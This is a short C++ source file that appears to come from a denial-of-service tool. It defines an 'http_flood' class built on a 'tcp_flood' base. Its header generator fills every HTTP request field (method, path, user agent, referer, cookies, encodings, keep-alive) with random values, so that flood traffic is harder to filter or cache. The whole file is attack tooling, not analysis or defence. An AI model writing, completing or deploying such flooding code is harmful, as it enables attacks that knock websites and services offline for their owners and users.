#include "http_flood.h"
#include "http.h"

int http_flood::gen_hdr(std::string &string) {
    httphdr hdr{};
    http::randomizer::random_method(hdr.method);
    utils::randomizer::randomstr(hdr.path);
    http::randomizer::random_useragent(hdr.useragent);
    http::randomizer::random_caching(hdr.cache_control);
    http::randomizer::random_encoding(hdr.encoding);
    http::randomizer::random_charset(hdr.charset[0]);
    http::randomizer::random_charset(hdr.charset[1]);
    http::randomizer::random_referer(hdr.referer);
    hdr.accept = "*/*";
    hdr.connection_type = "Keep-Alive";
    http::randomizer::random_contenttype(hdr.content_type);
    utils::randomizer::randomstr(hdr.cookie[0]);
    utils::randomizer::randomstr(hdr.cookie[1]);
    hdr.keep_alive = utils::randomizer::randomInt(1, 5000);
    hdr.DNT = utils::randomizer::randomInt(0, 1);
    http::hdr_gen(hdr, string);
    string += "\r\n";
    return static_cast<int>(string.length());
}

http_flood::http_flood(std::shared_ptr<Config> config) : tcp_flood(std::move(config)) {

}
